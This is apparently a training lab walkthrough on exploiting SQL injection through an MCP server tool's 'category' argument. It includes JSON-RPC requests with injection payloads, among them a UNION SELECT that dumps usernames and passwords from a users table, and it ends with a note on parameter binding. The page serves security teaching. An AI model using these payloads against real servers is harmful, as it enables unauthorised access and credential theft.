---
layout: default
title: SQL Injection in an MCP Server Tool
permalink: /labs/sql-injection-in-mcp-tool/
---

# SQL Injection in an MCP Server Tool

## Goal

Find the administrator credentials through the lab's `list_products` MCP tool, then use them to sign in.

## Walkthrough

1. Open the assigned lab in Burp Suite and send a request to `/mcp` so Burp captures the MCP initialization exchange. Keep using that same lab host and session for every request.
2. Send `tools/list` and inspect the response. Find `list_products` and note that its `category` argument is passed as text.

   ```json
   {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
   ```

3. Call the tool with an ordinary category first. Then add a single quote to the value. The malformed query produces an error instead of the normal product list, indicating that the value is affecting the SQL statement.

   ```json
   {
     "jsonrpc":"2.0",
     "id":3,
     "method":"tools/call",
     "params":{"name":"list_products","arguments":{"category":"Gifts'"}}
   }
   ```

4. Check whether a true condition changes the result. The following lab input returns products, confirming the injection point:

   ```json
   {
     "jsonrpc":"2.0",
     "id":4,
     "method":"tools/call",
     "params":{"name":"list_products","arguments":{"category":"Gifts' OR 1=1--"}}
   }
   ```

5. Match the original query's column count with a `UNION SELECT`. Two `NULL` values are accepted, so the query has two columns:

   ```json
   {
     "jsonrpc":"2.0",
     "id":5,
     "method":"tools/call",
     "params":{"name":"list_products","arguments":{"category":"Gifts' UNION SELECT NULL,NULL--"}}
   }
   ```

6. Replace the `NULL` values with the lab's `users` table fields. The returned rows include usernames and passwords:

   ```json
   {
     "jsonrpc":"2.0",
     "id":6,
     "method":"tools/call",
     "params":{"name":"list_products","arguments":{"category":"Gifts' UNION SELECT username,password FROM users--"}}
   }
   ```

7. Use the administrator row from the response to sign in at `/login`. The lab's solved banner confirms completion.

## Why it works

The server builds a database query from the tool argument rather than binding it as a parameter. MCP does not change the underlying SQL injection risk: tool arguments must be treated as untrusted input.
